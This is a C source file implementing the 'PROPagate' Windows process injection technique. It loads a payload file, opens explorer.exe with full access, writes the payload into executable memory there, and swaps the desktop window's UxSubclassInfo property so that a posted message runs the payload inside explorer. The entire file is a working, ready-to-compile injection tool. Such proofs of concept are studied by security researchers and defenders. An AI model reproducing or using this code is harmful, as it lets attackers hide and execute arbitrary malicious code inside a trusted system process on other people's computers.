/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#define UNICODE
#include <windows.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "comctl32.lib")

#include <stdio.h>

typedef LRESULT (CALLBACK *SUBCLASSPROC)(
   HWND      hWnd,
   UINT      uMsg,
   WPARAM    wParam,
   LPARAM    lParam,
   UINT_PTR  uIdSubclass,
   DWORD_PTR dwRefData);

typedef struct _SUBCLASS_CALL {
  SUBCLASSPROC pfnSubclass;    // subclass procedure
  WPARAM       uIdSubclass;    // unique subclass identifier
  DWORD_PTR    dwRefData;      // optional ref data
} SUBCLASS_CALL, PSUBCLASS_CALL;

typedef struct _SUBCLASS_FRAME {
  UINT                    uCallIndex;   // index of next callback to call
  UINT                    uDeepestCall; // deepest uCallIndex on stack
  struct _SUBCLASS_FRAME  *pFramePrev;  // previous subclass frame pointer
  struct _SUBCLASS_HEADER *pHeader;     // header associated with this frame
} SUBCLASS_FRAME, PSUBCLASS_FRAME;

typedef struct _SUBCLASS_HEADER {
  UINT           uRefs;        // subclass count
  UINT           uAlloc;       // allocated subclass call nodes
  UINT           uCleanup;     // index of call node to clean up
  DWORD          dwThreadId;   // thread id of window we are hooking
  SUBCLASS_FRAME *pFrameCur;   // current subclass frame pointer
  SUBCLASS_CALL  CallArray[1]; // base of packed call node array
} SUBCLASS_HEADER, *PSUBCLASS_HEADER;

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

VOID propagate(LPVOID payload, DWORD payloadSize) {
    HANDLE          hp, p;
    DWORD           id;
    HWND            pwh, cwh;
    SUBCLASS_HEADER sh;
    LPVOID          psh, pfnSubclass;
    SIZE_T          rd,wr;

    // 1. Obtain the parent window handle
    pwh = FindWindow(L"Progman", NULL);

    // 2. Obtain the child window handle
    cwh = FindWindowEx(pwh, NULL, L"SHELLDLL_DefView", NULL);

    // 3. Obtain the handle of subclass header
    p = GetProp(cwh, L"UxSubclassInfo");

    // GetProcessHandleFromHwnd
    // 4. Obtain the process id for the explorer.exe
    GetWindowThreadProcessId(cwh, &id);

    // 5. Open explorer.exe
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 6. Read the contents of current subclass header
    ReadProcessMemory(hp, (LPVOID)p, &sh, sizeof(sh), &rd);

    // 7. Allocate RW memory for a new subclass header
    psh = VirtualAllocEx(hp, NULL, sizeof(sh),
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    // 8. Allocate RWX memory for the payload
    pfnSubclass = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // 9. Write the payload to memory
    WriteProcessMemory(hp, pfnSubclass,
        payload, payloadSize, &wr);

    // 10. Set the pfnSubclass field to payload address, and write
    //    back to process in new area of memory
    sh.CallArray[0].pfnSubclass = (SUBCLASSPROC)pfnSubclass;
    WriteProcessMemory(hp, psh, &sh, sizeof(sh), &wr);

    // 11. update the subclass procedure with SetProp
    SetProp(cwh, L"UxSubclassInfo", psh);

    // 12. Trigger the payload via a windows message
    PostMessage(cwh, WM_CLOSE, 0, 0);

    // 13. Restore original subclass header
    SetProp(cwh, L"UxSubclassInfo", p);

    // 14. free memory and close handles
    VirtualFreeEx(hp, psh, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, pfnSubclass, 0, MEM_DECOMMIT | MEM_RELEASE);

    CloseHandle(hp);
}

int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;

    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc!=2){printf("usage: propagate <payload>\n");return 0;}

    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    propagate(pic, len);
    return 0;
}